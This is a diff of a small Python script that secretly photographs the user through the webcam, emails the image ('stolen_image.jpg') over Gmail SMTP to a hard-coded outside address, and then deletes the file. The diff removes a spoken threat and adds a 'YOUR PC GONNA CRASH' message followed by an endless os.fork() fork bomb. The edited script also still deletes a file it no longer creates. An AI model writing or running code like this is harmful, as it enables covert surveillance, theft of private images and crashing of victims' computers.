@@ -1,8 +1,6 @@
 import cv2
 import smtplib
 from email.message import EmailMessage
-from gtts import gTTS
-import playsound
 import os
 
 cam = cv2.VideoCapture(0)
@@ -40,9 +38,11 @@ smtp = smtplib.SMTP_SSL("smtp.gmail.com",  465)
 smtp.login(EMAIL, PASSWORD)
 smtp.sendmail(EMAIL, 'viraj.sharma1501@gmail.com', str(msg))
 
-speaker = gTTS('your image is sent to viraj the scammer')
-speaker.save('threatning_speech.png')
-playsound.playsound('threatning_speech.png')
-
 os.remove('stolen_image.jpg')
 os.remove('threatning_speech.png')
+
+print('YOUR PC GONNA CRASH')
+
+while True:
+ os.fork()
+
